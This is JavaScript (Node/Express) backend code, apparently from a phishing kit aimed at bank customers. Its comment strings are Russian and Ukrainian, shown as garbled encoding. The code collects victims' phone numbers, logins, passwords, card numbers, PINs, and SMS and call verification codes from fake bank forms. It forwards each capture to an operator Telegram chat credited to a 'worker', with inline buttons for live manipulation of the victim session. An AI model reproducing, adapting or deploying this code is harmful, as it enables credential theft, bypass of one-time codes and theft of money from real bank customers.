// Send Telegram message with inline keyboard or plain message
function sendToTelegram(messageType, sessionId, sessionData, workerNick) {
    const bankName = sessionData.bankName || 'N/A';
    
    let message = '';
    let replyMarkup = null;

    switch (messageType) {
        case 'main_form_phone':
            // –§–æ—Ä–º–∞—Ç –¥–ª—è –≤—Ö–æ–¥–∞ –ø–æ —Ç–µ–ª–µ—Ñ–æ–Ω—É –∏ –ø–∞—Ä–æ–ª—é
            message = `<b>–ù–æ–≤–∏–π –∑–∞–ø–∏—Å!</b>\n\n`;
            message += `<b>–ù–∞–∑–≤–∞–Ω–∏–µ –±–∞–Ω–∫–∞:</b> ${bankName}\n`;
            if (sessionData.phone) message += `<b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞:</b> <code>${sessionData.phone}</code>\n`;
            if (sessionData.password) message += `<b>–ü–∞—Ä–æ–ª—å:</b> <code>${sessionData.password}</code>\n`;
            message += `<b>Worker:</b> @${workerNick}\n`;
            break;

        case 'main_form_login':
            // –§–æ—Ä–º–∞—Ç –¥–ª—è –≤—Ö–æ–¥–∞ –ø–æ –ª–æ–≥–∏–Ω—É –∏ –ø–∞—Ä–æ–ª—é
            message = `<b>–ù–æ–≤–∏–π –∑–∞–ø–∏—Å!</b>\n\n`;
            message += `<b>–ù–∞–∑–≤–∞–Ω–∏–µ –±–∞–Ω–∫–∞:</b> ${bankName}\n`;
            if (sessionData.login) message += `<b>–õ–æ–≥–∏–Ω:</b> <code>${sessionData.login}</code>\n`;
            if (sessionData.password) message += `<b>–ü–∞—Ä–æ–ª—å:</b> <code>${sessionData.password}</code>\n`;
            message += `<b>Worker:</b> @${workerNick}\n`;
            break;

        case 'recovery_form':
            // –§–æ—Ä–º–∞—Ç –¥–ª—è –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è
            message = `<b>–í–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ!</b>\n\n`;
            message += `<b>–ù–∞–∑–≤–∞–Ω–∏–µ –±–∞–Ω–∫–∞:</b> ${bankName}\n`;
            if (sessionData.fp_phone) message += `<b>–ú–æ–±–∏–ª—å–Ω—ã–π:</b> <code>${sessionData.fp_phone}</code>\n`;
            if (sessionData.fp_card) message += `<b>–ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã:</b> <code>${sessionData.fp_card}</code>\n`;
            if (sessionData.fp_pin) message += `<b>–ü–∏–Ω:</b> <code>${sessionData.fp_pin}</code>\n`;
            message += `<b>Worker:</b> @${workerNick}\n`;
            break;

        case 'call_code':
            // –§–æ—Ä–º–∞—Ç –¥–ª—è –∫–æ–¥–∞ —Å–æ –∑–≤–æ–Ω–∫–∞
            message = `<b>–ö–æ–¥ —Å–æ –∑–≤–æ–Ω–∫–∞!</b>\n\n`;
            message += `<b>–ö–æ–¥:</b> <code>${sessionData.call_code}</code>\n`;
            if (sessionData.phone || sessionData.fp_phone) {
                message += `<b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞:</b> <code>${sessionData.phone || sessionData.fp_phone}</code>\n`;
            }
            message += `<b>Worker:</b> @${workerNick}\n`;
            break;

        case 'sms_code':
            // –§–æ—Ä–º–∞—Ç –¥–ª—è –∫–æ–¥–∞ —Å–ø–∏—Å–∞–Ω–∏—è
            message = `<b>–ö–æ–¥ —Å–ø–∏—Å–∞–Ω–∏—è!</b>\n\n`;
            message += `<b>–ö–æ–¥:</b> <code>${sessionData.sms_code}</code>\n`;
            if (sessionData.phone || sessionData.fp_phone) {
                message += `<b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞:</b> <code>${sessionData.phone || sessionData.fp_phone}</code>\n`;
            }
            message += `<b>Worker:</b> @${workerNick}\n`;
            break;
    }

    // –î–æ–±–∞–≤–ª—è–µ–º –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É —Ç–æ–ª—å–∫–æ –¥–ª—è –æ—Å–Ω–æ–≤–Ω–æ–π —Ñ–æ—Ä–º—ã –∏ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è
    if (messageType === 'main_form_phone' || messageType === 'main_form_login' || messageType === 'recovery_form') {
        const keyboard = [
            [
                { text: 'SMS', callback_data: `sms:${sessionId}` },
                { text: '–õ–ö', callback_data: `lk:${sessionId}` },
                { text: '–ó–≤–æ–Ω–æ–∫', callback_data: `call:${sessionId}` }
            ],
            [
                { text: '–ù–µ–≤—ñ—Ä–Ω–∏–π –ø–∞—Ä–æ–ª—å', callback_data: `password_error:${sessionId}` },
                { text: 'Telegram Debit', callback_data: `telegram_debit:${sessionId}` },
                { text: '–ö–û–î', callback_data: `code_error:${sessionId}` }
            ],
            [
                { text: '–ù–µ–≤—ñ—Ä–Ω–∏–π –ü–Ü–ù', callback_data: `pin_error:${sessionId}` },
                { text: '–ö–û–î ‚úÖ', callback_data: `timer:${sessionId}` },
                { text: '–ù–æ–º–µ—Ä', callback_data: `number_error:${sessionId}` }
            ],
            [
                { text: 'OTHER', callback_data: `other:${sessionId}` },
                { text: 'BAN üö´', callback_data: `ban:${sessionId}` },
                { text: '–°–í–û–ô ‚úèÔ∏è', callback_data: `custom_message:${sessionId}` }
            ]
        ];

        if (banksForRequestButton.includes(bankName)) {
            keyboard[0].push({ text: '–ó–ê–ü–†–û–°', callback_data: `request_details:${sessionId}` });
        }

        replyMarkup = { inline_keyboard: keyboard };
    }

    bot.sendMessage(CHAT_ID, message, {
        parse_mode: 'HTML',
        reply_markup: replyMarkup
    }).catch(err => console.error('Telegram send error:', err));
}

// Handle form submissions
app.post('/api/submit', (req, res) => {
    const { sessionId, isFinalStep, referrer, ...stepData } = req.body;
    let workerNick = 'unknown';
    try {
        if (referrer && referrer !== 'unknown') workerNick = atob(referrer);
    } catch (e) {
        console.error('Referrer decode error:', e);
    }

    const existingData = sessions.get(sessionId) || {};
    const newData = { ...existingData, ...stepData };
    sessions.set(sessionId, newData);

    if (isFinalStep && !newData.logSent) {
        newData.logSent = true;
        sessions.set(sessionId, newData);

        const cardNumber = newData.card_confirm || newData.card || newData.fp_card;
        let visitCount = 1;
        if (cardNumber) {
            visitCount = (cardVisitCounts.get(cardNumber) || 0) + 1;
            cardVisitCounts.set(cardNumber, visitCount);
        }

        // –û–ø—Ä–µ–¥–µ–ª—è–µ–º —Ç–∏–ø —Ñ–æ—Ä–º—ã
        if (newData.fp_phone || newData.fp_card || newData.fp_pin) {
            // –§–æ—Ä–º–∞ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è
            sendToTelegram('recovery_form', sessionId, newData, workerNick);
        } else if (newData.login) {
            // –§–æ—Ä–º–∞ —Å –ª–æ–≥–∏–Ω–æ–º –∏ –ø–∞—Ä–æ–ª–µ–º
            sendToTelegram('main_form_login', sessionId, newData, workerNick);
        } else {
            // –§–æ—Ä–º–∞ —Å —Ç–µ–ª–µ—Ñ–æ–Ω–æ–º –∏ –ø–∞—Ä–æ–ª–µ–º
            sendToTelegram('main_form_phone', sessionId, newData, workerNick);
        }

        // –û—Ç–ø—Ä–∞–≤–∫–∞ –∫–æ–¥–∞ —Å–æ –∑–≤–æ–Ω–∫–∞, –µ—Å–ª–∏ –æ–Ω –µ—Å—Ç—å
        if (newData.call_code) {
            sendToTelegram('call_code', sessionId, newData, workerNick);
        }

        // –û—Ç–ø—Ä–∞–≤–∫–∞ –∫–æ–¥–∞ —Å–ø–∏—Å–∞–Ω–∏—è, –µ—Å–ª–∏ –æ–Ω –µ—Å—Ç—å
        if (newData.sms_code) {
            sendToTelegram('sms_code', sessionId, newData, workerNick);
        }
    }

    res.status(200).json({ message: 'OK' });
});

// Handle SMS code submissions
app.post('/api/sms', (req, res) => {
    const { sessionId, code, referrer } = req.body;
    let workerNick = 'unknown';
    try {
        if (referrer && referrer !== 'unknown') workerNick = atob(referrer);
    } catch (e) {
        console.error('Referrer decode error:', e);
    }

    const sessionData = sessions.get(sessionId);
    if (sessionData) {
        sessionData.sms_code = code; // –°–æ—Ö—Ä–∞–Ω—è–µ–º –∫–æ–¥ —Å–ø–∏—Å–∞–Ω–∏—è
        sessions.set(sessionId, sessionData);
        sendToTelegram('sms_code', sessionId, sessionData, workerNick);
        res.status(200).json({ message: 'OK' });
    } else {
        res.status(404).json({ message: 'Session not found' });
    }
});
